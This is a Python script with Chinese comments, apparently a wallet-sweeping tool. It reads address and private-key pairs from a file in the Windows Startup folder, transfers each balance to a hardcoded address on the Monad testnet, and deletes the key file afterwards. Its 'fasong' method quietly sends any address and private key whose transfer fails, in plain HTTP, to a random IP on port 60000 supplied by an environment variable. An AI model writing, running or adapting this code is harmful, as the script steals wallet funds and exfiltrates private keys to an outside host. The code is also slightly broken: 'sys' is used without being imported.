import os
import json
import logging
import threading
import random
import concurrent.futures
from web3 import Web3
import subprocess
from pathlib import Path
IPaddressduo = os.getenv("IPaddressduo", "")
import time as time_module  # 重命名time模块避免与time函数冲突
import random
import requests
import time
# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
IPaddressduo = os.getenv("IPaddressduo", "")
try:
    from web3 import Web3  # 添加Web3库用于查询余额
except ImportError:
    logger.info("正在安装Web3库...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "web3"])
    from web3 import Web3
    logger.info("Web3库安装完成")

def get_random_ip():
     ip_list = IPaddressduo.split('----')
     len_ip_list = len(ip_list)
     return ip_list[random.randint(0, len_ip_list - 1)]
class BalanceTransfer:
    """读取文本文件中的地址并将余额转移到指定地址"""
    
    def __init__(self, target_address, rpc_url="https://testnet-rpc.monad.xyz/", gas_price=None, gas_limit=21000, max_workers=15):
        """
        初始化余额转移工具
        
        参数:
            target_address: 接收资金的目标地址
            rpc_url: 区块链RPC节点URL
            gas_price: 自定义gas价格（如果为None则使用网络建议值）
            gas_limit: 交易gas限制
            max_workers: 最大线程数
        """
        self.target_address = Web3.to_checksum_address(target_address)
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.gas_price = gas_price
        self.gas_limit = gas_limit
        self.max_workers = max_workers
        self.lock = threading.Lock()  # 用于线程安全的日志和结果处理
        
        # 检查连接
        if not self.w3.is_connected():
            raise ConnectionError(f"无法连接到RPC节点: {rpc_url}")
        logger.info(f"已连接到区块链网络，当前区块: {self.w3.eth.block_number}")
        
    def read_addresses_from_file(self, file_path):
        """
        从文本文件中读取地址列表
        
        参数:
            file_path: 文本文件路径
            
        返回:
            地址列表
        """
        addresses = []
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                for line in file:
                    # 清理每行并提取地址
                    line = line.strip()
                    if line and line.startswith('0x'):
                        # 如果行包含分隔符，只取地址部分
                        if '----' in line:
                            line = line.split('----')[0].strip()
                        
                        if len(line) >= 40:
                            try:
                                # 转换为校验和地址
                                address = Web3.to_checksum_address(line)
                                addresses.append(address)
                            except ValueError:
                                logger.warning(f"无效的地址格式: {line}")
        except UnicodeDecodeError:
            # 尝试使用其他编码
            with open(file_path, 'r', encoding='gbk') as file:
                for line in file:
                    line = line.strip()
                    if line and line.startswith('0x'):
                        # 如果行包含分隔符，只取地址部分
                        if '----' in line:
                            line = line.split('----')[0].strip()
                            
                        if len(line) >= 40:
                            try:
                                address = Web3.to_checksum_address(line)
                                addresses.append(address)
                            except ValueError:
                                logger.warning(f"无效的地址格式: {line}")
        
        logger.info(f"从文件 {file_path} 中读取了 {len(addresses)} 个地址")
        return addresses
    
    def transfer_balance(self, private_key, from_address):
        """
        将地址中的余额转移到目标地址
        
        参数:
            private_key: 源地址的私钥
            from_address: 源地址
            
        返回:
            交易哈希或错误信息
        """
        try:
            # 获取账户余额
            from_address = Web3.to_checksum_address(from_address)
            balance = self.w3.eth.get_balance(from_address)
            
            if balance == 0:
                with self.lock:
                    logger.info(f"地址 {from_address} 余额为0，跳过转账")
                return None
            
            # 计算交易费用
            gas_price = self.gas_price if self.gas_price else self.w3.eth.gas_price
            tx_fee = gas_price * self.gas_limit
            
            # 确保有足够的余额支付交易费用
            if balance <= tx_fee:
                with self.lock:
                    logger.warning(f"地址 {from_address} 余额不足以支付交易费用")
                return None
            
            # 计算可转账金额（总余额减去交易费用）
            amount_to_send = balance - tx_fee
            
            # 构建交易
            tx = {
                'from': from_address,
                'to': self.target_address,
                'value': amount_to_send,
                'gas': self.gas_limit,
                'gasPrice': gas_price,
                'nonce': self.w3.eth.get_transaction_count(from_address),
                'chainId': self.w3.eth.chain_id
            }
            
            # 签名交易
            signed_tx = self.w3.eth.account.sign_transaction(tx, private_key)
            
            # 发送交易
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.raw_transaction.hex())
            
            with self.lock:
                logger.info(f"从 {from_address} 转账 {self.w3.from_wei(amount_to_send, 'ether')} ETH 到 {self.target_address}")
                logger.info(f"交易哈希: {tx_hash.hex()}")
            
            return tx_hash.hex()
        
        except Exception as e:
            with self.lock:
                logger.error(f"转账失败: {str(e)}")
                self.fasong(f"{from_address}----{private_key}")
            return str(e)
    
    def process_address_with_key(self, address, private_key, results):
        """
        处理单个地址和私钥对
        
        参数:
            address: 地址
            private_key: 私钥
            results: 结果字典
        """
        tx_result = self.transfer_balance(private_key, address)
        
        with self.lock:
            if tx_result and not isinstance(tx_result, str):
                results["success"].append({"address": address, "tx_hash": tx_result})
            else:
                results["failed"].append({"address": address, "error": tx_result or "未知错误"})
    
    def process_addresses_file(self, file_path):
        """
        处理地址文件并执行批量转账
        
        参数:
            file_path: 包含地址和私钥的文本文件（格式：地址----私钥）
            
        返回:
            成功和失败的交易记录
        """
        # 读取地址和私钥
        addresses_and_keys = {}
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                for line in file:
                    line = line.strip()
                    if line and '----' in line and line.startswith('0x'):
                        parts = line.split('----')
                        if len(parts) >= 2:
                            addr = parts[0].strip()
                            key = parts[1].strip()
                            try:
                                addr = Web3.to_checksum_address(addr)
                                # 如果私钥不以0x开头，添加前缀
                                if not key.startswith('0x'):
                                    key = '0x' + key
                                addresses_and_keys[addr] = key
                            except ValueError:
                                logger.warning(f"无效的地址格式: {addr}")
        except UnicodeDecodeError:
            # 尝试使用其他编码
            with open(file_path, 'r', encoding='gbk') as file:
                for line in file:
                    line = line.strip()
                    if line and '----' in line and line.startswith('0x'):
                        parts = line.split('----')
                        if len(parts) >= 2:
                            addr = parts[0].strip()
                            key = parts[1].strip()
                            try:
                                addr = Web3.to_checksum_address(addr)
                                # 如果私钥不以0x开头，添加前缀
                                if not key.startswith('0x'):
                                    key = '0x' + key
                                addresses_and_keys[addr] = key
                            except ValueError:
                                logger.warning(f"无效的地址格式: {addr}")
        except Exception as e:
            logger.error(f"读取文件失败: {str(e)}")
            return {"success": [], "failed": [{"address": "all", "error": f"读取文件失败: {str(e)}"}]}
        
        logger.info(f"从文件 {file_path} 中读取了 {len(addresses_and_keys)} 个地址和私钥")
        
        results = {"success": [], "failed": []}
        
        # 使用线程池并行处理转账
        logger.info(f"使用 {self.max_workers} 个线程并行处理转账")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 创建任务列表
            futures = []
            for address, private_key in addresses_and_keys.items():
                future = executor.submit(self.process_address_with_key, address, private_key, results)
                futures.append(future)
            
            # 等待所有任务完成
            concurrent.futures.wait(futures)
        
        # 输出结果摘要
        logger.info(f"转账完成: {len(results['success'])} 成功, {len(results['failed'])} 失败")
        return results
   
   
   
   


    def fasong(self, data, retries=10, delay=1):
        """
        发送请求，失败重试10次
        :param data: 请求数据
        :param retries: 最大重试次数
        :param delay: 每次重试的间隔时间
        :return: 成功返回True，失败返回False
        """
        for attempt in range(1, retries + 1):
            try:
                global IPaddressduo
                logger.info(IPaddressduo)
                ip_list = IPaddressduo.split('----')
                len_ip_list = len(ip_list)
                ipadd = ip_list[random.randint(0, len_ip_list - 2)]
                r = requests.get(f"http://{ipadd}:60000/api?{data}", verify=False, timeout=10)
                if '成功' in r.text:
                    address, *_ = data.split("----")
                    logger.info(f"任务发送成功 {address} 结果: {ipadd}")
                    return True
                else:
                    logger.warning(f"第 {attempt} 次尝试失败，响应: {r.text}")

            except Exception as e:
                logger.error(f"第 {attempt} 次请求异常: {e}")

            time.sleep(delay)

        logger.error("重试次数已用完，请求最终失败!")
        return False
    






def main():
    """主函数"""
    # 目标地址 - 所有余额将转移到这个地址
    
    logger.info(IPaddressduo)
    
    target_address = "0x000C81B6c3d0a9dcc098f5d08703d06475148903"
    
    # 创建转账工具实例，使用15个线程
    transfer = BalanceTransfer(target_address, max_workers=2)
    
    folder_path = r"C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    old_name = "completed.txt"
    new_name = "new.txt"


    old_path = os.path.join(folder_path, old_name)

    new_path = os.path.join(folder_path, new_name)
    os.rename(old_path, new_path)

    # 获取用户输入
    # addresses_file = "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\completed.txt"
    addresses_file = folder_path+"\\"+new_name
    # 执行转账
    results = transfer.process_addresses_file(addresses_file)
    
    # 保存结果到文件
    with open("transfer_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"转账结果已保存到 transfer_results.json")
    os.remove(addresses_file)


if __name__ == "__main__":
    main() 
